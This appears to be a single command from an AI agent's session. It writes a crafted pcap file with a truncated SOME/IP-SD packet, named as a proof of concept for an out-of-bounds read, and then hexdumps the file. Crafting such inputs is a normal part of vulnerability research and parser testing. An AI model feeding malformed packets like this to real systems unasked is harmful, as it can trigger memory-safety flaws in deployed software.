Running command: cd /workspace && python3 - <<'PY'
import struct
# Build Ethernet + IPv4 + UDP + SOME/IP-SD truncated payload
eth = bytes.fromhex('00112233445566778899aabb0800')
someip = struct.pack('!HHIHHBBBB', 0xffff, 0x8100, 12, 0x1234, 0x5678, 1, 1, 0x00, 0) + struct.pack('!I', 0)
udplen = 8 + len(someip)
ip_tot = 20 + udplen
ip = struct.pack('!BBHHHBBHII', 0x45, 0, ip_tot, 0, 0, 64, 17, 0, 0x0a000001, 0x0a000002)
udp = struct.pack('!HHHH', 30490, 30490, udplen, 0)
pkt = eth + ip + udp + someip
pcap = struct.pack('<IHHIIII', 0xa1b2c3d4, 2, 4, 0, 0, 65535, 1)
pcap += struct.pack('<IIII', 0, 0, len(pkt), len(pkt)) + pkt
open('/workspace/poc_someipsd_lenopts_oob.pcap','wb').write(pcap)
print(len(someip), len(pkt), len(pcap))
print(someip.hex())
PY
xxd -g1 /workspace/poc_someipsd_lenopts_oob.pcap | head -20
